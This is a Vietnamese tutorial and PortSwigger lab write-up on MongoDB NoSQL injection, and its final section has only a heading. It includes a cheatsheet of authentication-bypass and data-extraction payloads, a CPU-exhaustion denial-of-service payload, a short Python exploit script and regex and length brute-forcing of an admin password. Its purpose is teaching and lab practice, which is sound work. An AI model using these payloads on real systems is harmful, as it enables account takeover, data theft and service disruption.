# NoSQL injection

![image](https://hackmd.io/_uploads/BJNNFw8op.png)

## Khái niệm & Khai thác & Phòng tránh

### MongoDB:

- MongoDB là một đại diện trong dòng NoSQL được sử dụng khá phổ biến hiện nay. Nó thích hợp cho việc lưu trữ các dữ liệu ít được đọc nhưng được thay đổi thường xuyên
- Trong MongoDB, mỗi cơ sở dữ liệu là 1 collection (tương ứng với table trong RDBMS). Mỗi collection bao gồm các document (tương ứng với row trong RDBMS), các document này có thể có cấu trúc khác nhau.
  ![image](https://hackmd.io/_uploads/Byuf3gPjp.png)

- MongoDB sử dụng cấu trúc JSON để lưu trữ dữ liệu theo các cặp (key, value) cho mỗi document. Một document là một cặp key-value:

VD: Một collection bao gồm một hoặc nhiều document:

```pgp!
{
     “Name” : ”Stark”,
     “Age” : ”15”,
     “Address” : ”Winterfell”
}
```

Một ví dụ khác của collection:

```javascrip!
{
     “Name” : ”Ned”,
     “Age” : ”40”,
     “Children” : [
          {“Name” : “Robb”, “Age” : ”15” },
          {“Name” : “Jon”, “Age” : ”14” },
          {“Name” : “Bran”, “Age” : ”7” },
          {“Name” : “Rickon”, “Age” : ”5” },
     ]
}
```

### Khái niệm

- NoSQL được viết tắt của “Non-Relational SQL” hay “Not-Only SQL”. Nó được giới thiệu lần đầu vào năm 1998, được sử dụng làm tên gọi chung của các hệ quản trị cơ sở dữ liệu không sử dụng mô hình dữ liệu quan hệ cũng như truy vấn SQL truyền thống trong việc lưu trữ và truy xuất dữ liệu.
- Điểm khác biệt lớn của các DB NoSQL so với các DB RDBMS là việc lưu trữ, truy xuất dữ liệu không thông qua câu lệnh SQL, vốn ở dạng string và có thể “inject” các biến đầu vào không được kiểm soát kỹ để tạo ra 1 truy vấn khác với truy vấn ban đầu.
- Với NoSQL, tư tưởng “inject” vẫn giống với SQL Injection truyền thống, nhưng thay vì “inject” vào một string, ta phải “inject” vào một cấu trúc khác. Cụ thể với MongoDB là JSON.
- Tính năng tiêm NoSQL là một lỗ hổng trong đó kẻ tấn công có thể can thiệp vào các truy vấn mà ứng dụng thực hiện đối với cơ sở dữ liệu NoSQL. Việc tiêm NoSQL có thể cho phép kẻ tấn công:
  - Bỏ qua cơ chế xác thực hoặc bảo vệ.
  - Trích xuất hoặc chỉnh sửa dữ liệu.
  - Gây ra sự từ chối dịch vụ.
  - Thực thi mã trên máy chủ.

Cơ sở dữ liệu NoSQL lưu trữ và truy xuất dữ liệu ở định dạng khác với các bảng quan hệ SQL truyền thống. Họ sử dụng nhiều ngôn ngữ truy vấn thay vì tiêu chuẩn chung như SQL và có ít ràng buộc quan hệ hơn.

- Các cuộc tấn công tiêm NoSQL có thể thực thi trong các khu vực khác nhau của ứng dụng so với việc tiêm SQL truyền thống. Khi SQL injection sẽ thực thi trong cơ sở dữ liệu, các biến thể NoSQL có thể thực thi trong lớp ứng dụng hoặc lớp cơ sở dữ liệu, tùy thuộc vào API NoSQL được sử dụng và mô hình dữ liệu. Thông thường, các cuộc tấn công tiêm NoSQL sẽ thực thi khi chuỗi tấn công được phân tích cú pháp, đánh giá hoặc nối thành một lệnh gọi API NoSQL.

### Khai thác

- Có hai kiểu chèn NoSQL khác nhau:
  - Chèn cú pháp - Điều này xảy ra khi bạn có thể phá vỡ cú pháp truy vấn NoSQL, cho phép bạn chèn tải trọng của riêng mình. Phương pháp này tương tự như phương pháp được sử dụng trong SQL . Tuy nhiên, bản chất của cuộc tấn công khác nhau đáng kể, vì cơ sở dữ liệu NoSQL sử dụng nhiều
  - Chèn toán tử - Điều này xảy ra khi bạn có thể sử dụng toán tử truy vấn NoSQL để thao tác truy vấn.
    Hãy xem một ví dụ cho thấy truy vấn SQL và truy vấn NoSQL khác nhau đối với cùng một chức năng.
- Hãy xem một ví dụ cho thấy truy vấn SQL và truy vấn NoSQL khác nhau đối với cùng một chức năng.

Truy vấn SQL điển hình để đăng nhập

```sql!
SELECT * FROM users WHERE user = '$username' AND pass = '$password'
```

Lệnh tương đương trong MongoDB

```sql!
‍db.users.find({user: username, pass: password});
```

```sql!
db.collection(‘users’).find({‘username’:admin, ‘password’: pass});
```

Bây giờ chúng ta đã thấy một truy vấn đơn giản để chọn người dùng bằng tên người dùng và mật khẩu, chúng ta có thể xem xét các toán tử khác trong MongoDB có thể cho phép chúng ta thao tác truy vấn.

![image](https://hackmd.io/_uploads/SJ8G-wIs6.png)

Sự hiện diện của tính năng tiêm NoSQL có thể được tìm thấy ở mọi nơi bất kể tham số URL, tham số POST, tiêu đề HTTP, v.v.
Bất cứ khi nào ứng dụng chấp nhận đầu vào của người dùng kết hợp với mã tạo truy vấn trong ứng dụng thì khả năng xảy ra các cuộc tấn công tiêm nhiễm.

- Một số dấu hiệu phổ biến

![image](https://hackmd.io/_uploads/Bkv1lzvj6.png)

```
POST /login HTTP/1.1
Host: example.org
Content-Type: application/x-www-form-urlencoded.
Content-Length: 29

user=admin&password[%24ne]=x
```

VD: Một lệnh lấy dữ liệu từ MongoDB trong PHP

```php!
$db->user->find(array(“uname”=>$_POST[“uname”], “passwd”=>$_POST[“passwd”])
```

- Trong lệnh trên, PHP sẽ lấy trong colection user một tập những document có chứa 2 cặp key-value
- Để tấn công NoSQL dạng này, ta sẽ lợi dụng việc PHP cho phép các biến nhập vào thuộc kiểu array và sử dụng 1 số toán tử của MongoDB để thay đổi giá trị trả về. Sau khi inject, cấu trúc chuỗi JSON truy vấn sẽ khác với chuỗi JSON ban đầu.
  Gửi Post data:

```php!
uname[$regex]=.*&passwd[$regex]=.*
```

Chuỗi JSON truy vấn sẽ trở thành:

```php!
{
     “uname”: { “$regex” : “.*”},
     “passwd”: { “$regex” : “.*”}
}
```

Toán tử $regex dùng để match 1 chuỗi regular expression với 1 string. Ở đây ta dùng “.\*”, sẽ match với một string bất kì.
Như vậy chuỗi JSON sau khi “inject” sẽ trả về tất cả các document trong collection user mà không có việc lọc username và password.
Ngoài ra ta có thể sử dụng các toán tử khác của MongoDB để khai thác như `or,and, in,notin`

- Kiểm tra lỗ hổng NoSQL Injection trong MongoDB
  API MongoDB mong đợi các lệnh gọi BSON (Binary JSON) và bao gồm một công cụ lắp ráp truy vấn BSON an toàn. Tuy nhiên, theo tài liệu MongoDB – các biểu thức JSON và JavaScript chưa được công nghệ hóa được cho phép trong một số tham số truy vấn thay thế. Lệnh gọi API được sử dụng phổ biến nhất cho phép nhập JavaScript tùy ý là toán tử $ where.

MongoDB $ nơi toán tử thường được sử dụng như một bộ lọc hoặc kiểm tra đơn giản, vì nó nằm trong SQL

```php!
db.myCollection.find ({$ where: "this.credits == this.debits"});
```

Theo tùy chọn, JavaScript cũng được đánh giá để cho phép các điều kiện nâng cao hơn.

```php!
<code>db.myCollection.find( { $where: function() { return obj.credits - obj.debits &lt; 0; } } );</code>
```

#### Ví dụ 1

- Nếu kẻ tấn công có thể thao túng dữ liệu được truyền vào toán tử $ where, kẻ tấn công đó có thể bao gồm JavaScript tùy ý để được đánh giá như một phần của truy vấn MongoDB. Một lỗ hổng mẫu được tiết lộ trong đoạn mã sau, nếu thông tin đầu vào của người dùng được chuyển trực tiếp vào truy vấn MongoDB mà không cần làm sạch.

```php!
db.myCollection.find( { active: true, $where: function() { return obj.credits - obj.debits < $userInput; } } );;
```

Với SQL injection thông thường, một lỗ hổng tương tự sẽ cho phép kẻ tấn công thực thi các lệnh SQL tùy ý – để lộ hoặc thao túng dữ liệu theo ý muốn. Tuy nhiên, vì JavaScript là một ngôn ngữ có đầy đủ tính năng, điều này không chỉ cho phép kẻ tấn công thao túng dữ liệu mà còn chạy mã tùy ý. Ví dụ: thay vì chỉ gây ra lỗi khi kiểm tra, việc khai thác đầy đủ sẽ sử dụng các ký tự đặc biệt để tạo JavaScript hợp lệ.

Đầu vào này

```javascript!
0; var date = new Date (); do {curDate = new Date ();} while (curDate-date &lt;10000)
```

- được chèn vào $ userInput trong mã ví dụ trên sẽ dẫn đến việc thực thi hàm JavaScript sau. Chuỗi tấn công cụ thể này sẽ yêu cầu toàn bộ cá thể MongoDB thực thi ở mức sử dụng 100% CPU trong 10 giây.

```php!
function() { return obj.credits - obj.debits &lt; 0;var date=new Date(); do{curDate = new Date();}while(curDate-date&lt;10000); }
```

#### Ví dụ 2

- Ngay cả khi đầu vào được sử dụng trong các truy vấn hoàn toàn được làm sạch hoặc được tham số hóa, vẫn có một đường dẫn thay thế trong đó người ta có thể kích hoạt chèn NoSQL. Nhiều phiên bản NoSQL có tên biến dành riêng, độc lập với ngôn ngữ lập trình ứng dụng.
- Ví dụ: trong MongoDB,$ trong đó cú pháp chính nó là một toán tử truy vấn dành riêng. Nó cần được chuyển vào truy vấn chính xác như được hiển thị; bất kỳ thay đổi nào sẽ gây ra lỗi cơ sở dữ liệu. Tuy nhiên, vì $ where cũng là một tên biến PHP hợp lệ, kẻ tấn công có thể chèn mã vào truy vấn bằng cách tạo một biến PHP có tên $ where. Tài liệu PHP MongoDB cảnh báo rõ ràng cho các nhà phát triển:
  - Vui lòng đảm bảo rằng đối với tất cả các toán tử truy vấn đặc biệt (bắt đầu bằng $), bạn sử dụng các dấu ngoặc kép để PHP không cố gắng thay thế $ exist bằng giá trị của biến $ exist.

Ngay cả khi một truy vấn không phụ thuộc vào dữ liệu người dùng nhập vào, chẳng hạn như ví dụ sau, kẻ tấn công có thể khai thác MongoDB bằng cách thay thế toán tử bằng dữ liệu độc hại.

```php!
db.myCollection.find( { $where: function() { return obj.credits - obj.debits < 0; } } );
```

#### Cheatsheet

vượt qua xác thực

```sql!
#in URL
username[$ne]=toto&password[$ne]=toto
username[$regex]=.*&password[$regex]=.*
username[$exists]=true&password[$exists]=true

#in JSON
{"username": {"$ne": null}, "password": {"$ne": null} }
{"username": {"$ne": "foo"}, "password": {"$ne": "bar"} }
{"username": {"$gt": undefined}, "password": {"$gt": undefined} }
```

SQL - Mongo

```sql!
query = { $where: `this.username == '${username}'` }
```

- Kẻ tấn công có thể khai thác điều này bằng cách nhập các chuỗi như `admin' || 'a'=='a`, khiến truy vấn trả về tất cả tài liệu bằng cách đáp ứng điều kiện với tautology ( 'a'=='a'). Điều này tương tự như các cuộc tấn công tiêm nhiễm SQL trong đó các đầu vào như ' or 1=1-- -được sử dụng để thao tác các truy vấn SQL. Trong MongoDB, việc chèn tương tự có thể được thực hiện bằng cách sử dụng các đầu vào như `' || 1==1//`, `' || 1==1%00` hoặc `admin' || 'a'=='a`.

```sql!
Normal sql: ' or 1=1-- -
Mongo sql: ' || 1==1//    or    ' || 1==1%00     or    admin' || 'a'=='a
```

trích xuất dữ liệu

```sql!
in URL (if length == 3)
username[$ne]=toto&password[$regex]=a.{2}
username[$ne]=toto&password[$regex]=b.{2}
...
username[$ne]=toto&password[$regex]=m.{2}
username[$ne]=toto&password[$regex]=md.{1}
username[$ne]=toto&password[$regex]=mdp

username[$ne]=toto&password[$regex]=m.*
username[$ne]=toto&password[$regex]=md.*

in JSON
{"username": {"$eq": "admin"}, "password": {"$regex": "^m" }}
{"username": {"$eq": "admin"}, "password": {"$regex": "^md" }}
{"username": {"$eq": "admin"}, "password": {"$regex": "^mdp" }}
```

```sql!
true, $where: '1 == 1'
, $where: '1 == 1'
$where: '1 == 1'
', $where: '1 == 1
1, $where: '1 == 1'
{ $ne: 1 }
', $or: [ {}, { 'a':'a
' } ], $comment:'successful MongoDB injection'
db.injection.insert({success:1});
db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1
|| 1==1
|| 1==1//
|| 1==1%00
}, { password : /.*/ }
' && this.password.match(/.*/)//+%00
' && this.passwordzz.match(/.*/)//+%00
'%20%26%26%20this.password.match(/.*/)//+%00
'%20%26%26%20this.passwordzz.match(/.*/)//+%00
{$gt: ''}
[$ne]=1
';sleep(5000);
';it=new%20Date();do{pt=new%20Date();}while(pt-it<5000);
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$ne": "foo"}, "password": {"$ne": "bar"}}
{"username": {"$gt": undefined}, "password": {"$gt": undefined}}
{"username": {"$gt":""}, "password": {"$gt":""}}
{"username":{"$in":["Admin", "4dm1n", "admin", "root", "administrator"]},"password":{"$gt":""}}
```

### Phòng tránh

Cách phòng tránh kinh điển và không thể thiếu đối với những ứng dụng dính lỗi Injection, đó là kiểm soát chặt chẽ đầu vào. Các cách phòng tránh NoSQL có thể là:

- Không cho phép biến đầu vào thuộc kiểu array
- Chặn 1 số kí tự, keyword: [, ], {, }, or,and, $regex, ...

## 1. Lab: Detecting NoSQL injection

link: https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-detection

### Đề bài

![image](https://hackmd.io/_uploads/SkQipIIi6.png)

### Phân tích

- Bộ lọc danh mục sản phẩm cho phòng thí nghiệm này được cung cấp bởi cơ sở dữ liệu MongoDB NoSQL. Nó dễ bị tấn công bởi NoSQL.
- Để giải quyết vấn đề lab, mình cần thực hiện một cuộc tấn công tiêm NoSQL khiến ứng dụng hiển thị các sản phẩm chưa được phát hành.

![image](https://hackmd.io/_uploads/SJDSJDIoa.png)

mình thử thêm payload `' or 1=1-- -` thì web hiện lỗi khi thực thi khi truy vấn cơ sở dữ liệu ở đây là mongo

câu lệnh truy vấn ở đây có thể là

```sql!
this.category == 'fizzy' && this.released == 1
```

Hạn chế `this.released == 1` được sử dụng để chỉ hiển thị các sản phẩm được phát hành. Đối với các sản phẩm chưa được phát hành, có lẽ là `this.released == 0`.
Nếu MongoDB bỏ qua tất cả các ký tự sau ký tự null, điều này sẽ loại bỏ yêu cầu đặt trường đã phát hành thành 1. Kết quả là tất cả các sản phẩm trong danh fizzymục đều được hiển thị, bao gồm cả các sản phẩm chưa được phát hành

### Khai thác

- mình gửi điều kiện boolean luôn đánh giá là đúng trong tham số danh mục. trong sql điều kiện `or 1=1` thì ở NoSQL mình sẽ sử dụng `'||1||'`, câu query sẽ tương đương với ' `'|| 1==1%00`

![image](https://hackmd.io/_uploads/SJMeSvUsa.png)

mình đã viết script khai thác

```python!
#!/usr/bin/python3.7
import requests
import re
from bs4 import BeautifulSoup
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from urllib.parse import quote

url = 'https://0a0c00c004943321857967c7000400d4.web-security-academy.net'

payload = "Accessories'|| 1==1%00"
response= requests.get(
    url + '/filter?category=' + payload,
    verify=False,
)

soup = BeautifulSoup(response.text,'html.parser')
print(soup)
```

mục đích của chúng ta đã thành công và mình đã solve được bài lab này

![image](https://hackmd.io/_uploads/H1gIFvUip.png)

## 2. Lab: Exploiting NoSQL operator injection to bypass authentication

link: https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-bypass-authentication

### Đề bài

![image](https://hackmd.io/_uploads/Sy48GZwiT.png)

### Phân tích

- Chức năng đăng nhập cho phòng thí nghiệm này được cung cấp bởi cơ sở dữ liệu MongoDB NoSQL. Nó dễ bị tấn công bằng cách tiêm NoSQL bằng toán tử MongoDB.
- Để giải quyết bài thí nghiệm, mình đăng nhập vào ứng dụng với tư cách là administratorngười dùng.
- mình có thể đăng nhập vào tài khoản của mình bằng thông tin đăng nhập sau: wiener:peter.

Đăng nhập vào thì mình thấy họ đẩy qua post body

![image](https://hackmd.io/_uploads/ByJMzzvja.png)

### Khai thác

- mình thử đổi mật khẩu và sử dụng operator $ne để bypass login thì thấy thành công với payload ```{"$ne": null}```

![image](https://hackmd.io/_uploads/rk8Zmzvia.png)

vậy là web cho chúng ta nhập đầu vào có thể là 1 mảng json

- mình đăng nhập với username admin nhưng thật không may là không thành công chúng ta có thể đã bị filter ở đâu đó hoặc tên đăng nhập của admin có các kí tự khác ở đằng sau mà mình không nắm rõ được. VD `admin_qwertyhjnbvcxzdfghjnms`

![image](https://hackmd.io/_uploads/SyaIuGPja.png)

mình thử dùng regex và thành công

![image](https://hackmd.io/_uploads/rJVJqfDo6.png)

- mình hiển thị response trên trình duyệt

![image](https://hackmd.io/_uploads/ByTbnMwsp.png)

mục đích của chúng ta đã hoàn thành và mình cũng đã giải quyết được lab này

![image](https://hackmd.io/_uploads/SkgnKzDjp.png)

## 3. Lab: Exploiting NoSQL injection to extract data

link: https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-extract-data

### Đề bài

![image](https://hackmd.io/_uploads/rykdnGPip.png)

### Phân tích

- Chức năng tra cứu người dùng cho phòng thí nghiệm này được cung cấp bởi cơ sở dữ liệu MongoDB NoSQL. Nó dễ bị tấn công bởi NoSQL.
- Để giải lab, trích xuất mật khẩu cho administratorngười dùng, sau đó đăng nhập vào tài khoản của họ.
- Bạn có thể đăng nhập vào tài khoản của mình bằng thông tin đăng nhập sau: `wiener:peter`.

mình đăng nhập tài khoản `wiener:peter` và thấy hiển thị vai trò và tên của người dùng

![image](https://hackmd.io/_uploads/r1VY6zDip.png)

website tìm kiếm user trước rồi mới vào my-account, mình sẽ lợi dụng entrypoint này để leak thông tin admin

![image](https://hackmd.io/_uploads/ByWXRMPo6.png)

- mình gửi một `'` ký tự trong tham số người dùng. Lưu ý rằng điều này gây ra lỗi

![image](https://hackmd.io/_uploads/BJJoCGwip.png)

- dữ liệu chúng ta nhập vào đã được tìm trong database và hiển thị ra giá trị vai trò của user
- trang web có thể dùng câu truy vấn

```sql!
{"$where":"this.username == 'admin'"}
```

Mình biết được username là

![image](https://hackmd.io/_uploads/ryUhCGwia.png)

mình kiểm tra các điều kiện bolean

- với payload : `' && '1'=='2` hiện thông báo không tìm thấy

![image](https://hackmd.io/_uploads/H1AHe7Do6.png)

- với payload : `' && '1'=='1` hiện thông tin của user

![image](https://hackmd.io/_uploads/SyktgXvoa.png)

dựa vào thông báo trên chúng ta có thể tấn công tương tự như kiểu boolean-base sql injection để dò được mật khẩu của admin

### Khai thác

- đầu tiên chúng ta cần xác định độ dài của chuỗi password với payload

```sql!
administrator' && this.password.length == 10 || 'a'=='b
```

mình cho vào intruder và brute force

![image](https://hackmd.io/_uploads/rJG_M7vop.png)

![image](https://hackmd.io/_uploads/rJxcGmwiT.png)

![image](https://hackmd.io/_uploads/BJadmQDia.png)

chúng ta thấy từ 9 trở đi độ dài response khác nên chúng ta có thể chắc chắn độ dài password ở đây là 8

giờ chúng ta sẽ đi tìm 8 ký tự này và chúng ta có hint mật khẩu là các chữ cái thường.

- mình cho vào intruder với kiểu cluster bom

![image](https://hackmd.io/_uploads/H15i4mviT.png)

Payload set 1 được chọn, sau đó thêm các số từ 0 đến 7 cho mỗi ký tự của mật khẩu.

![image](https://hackmd.io/_uploads/SyZZHmvj6.png)

Chọn Payload set 2 , sau đó thêm chữ thường từ a đến z

![image](https://hackmd.io/_uploads/S1BIHQDsp.png)

sau một hồi trờ đợi mình được mật khẩu của admin là **"dzbcohlr"**

![image](https://hackmd.io/_uploads/HyeNYmPjp.png)

mình đăng nhập với tài khoản **administrator:dzbcohlr** và solve được lab này

![image](https://hackmd.io/_uploads/Hyo3uXDsT.png)

## 4. Lab: Exploiting NoSQL operator injection to extract unknown fields

link: https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-extract-unknown-fields

### Đề bài

![image](https://hackmd.io/_uploads/ry7-0EvjT.png)

### Phân tích

- Chức năng tra cứu người dùng cho phòng thí nghiệm này được cung cấp bởi cơ sở dữ liệu MongoDB NoSQL. Nó dễ bị tấn công bởi NoSQL .
- Để giải bài lab, chúng ta cần đăng nhập với tên carlos.
- Lab hint rằng để solve lab thì phải lấy được reset token của carlos trước, nên mình sẽ đi tìm nó

![image](https://hackmd.io/_uploads/Hy7W1rDsa.png)

mình bắt request đăng nhập và dùng payload để bypass ở phần mật khẩu và kết quả hiện thông báo khóa tài khoản

- mình không thể truy cập vào tài khoản của Carlos nhưng phản hồi này cho thấy `$ne` đã được chấp nhận và ứng dụng có lỗ hổng.

kiểm tra xem ứng dụng có dễ bị chèn JavaScript hay không:

Thêm làm "$where": "0"tham số bổ sung trong dữ liệu JSON với payload như sau:

```javascript!
{
    "username":"carlos",
    "password":{"$ne":"invalid"},
    "$where": "0"
}
```

![image](https://hackmd.io/_uploads/HJu8bSvsT.png)

- mình nhận được thông báo lỗi `Invalid username or password`.

![image](https://hackmd.io/_uploads/Hk_c-rvo6.png)

- Thay đổi "$where": "1", sau đó gửi lại yêu cầu. Lưu ý rằng bạn nhận được một Account lockedthông báo lỗi. Điều này chỉ ra rằng mệnh đề JavaScript trong ` $where` đang được đánh giá.

### Khai thác
